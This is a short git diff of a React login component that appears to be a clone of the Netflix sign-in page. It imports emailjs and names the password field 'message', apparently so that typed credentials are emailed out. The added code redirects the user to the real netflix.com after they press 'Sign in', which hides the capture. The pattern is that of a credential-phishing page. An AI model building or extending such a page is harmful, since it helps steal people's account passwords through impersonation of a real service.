@@ -1,10 +1,13 @@
 import React, { useState } from 'react';
+import {Routes, Route, useNavigate} from 'react-router-dom';
 import Nav from '../../components/Nav/Nav';
 import emailjs from '@emailjs/browser';
 import './Login.css';
-
-
 import { useRef } from 'react';
+
+const handleClick = () => {
+  window.location.replace('https://www.netflix.com/browse');
+};
 
 const Login = () => {
 
@@ -43,7 +46,7 @@ const Login = () => {
               <input type="password" name="message" required />
               <label >Password</label>
             </div>
-            <button type='submit' >Sign in</button>
+            <button type='submit' onClick={handleClick}  >Sign in</button>
             <div className="form-helper">
               <div className="remember">
                 <input type="checkbox" id='remember' />
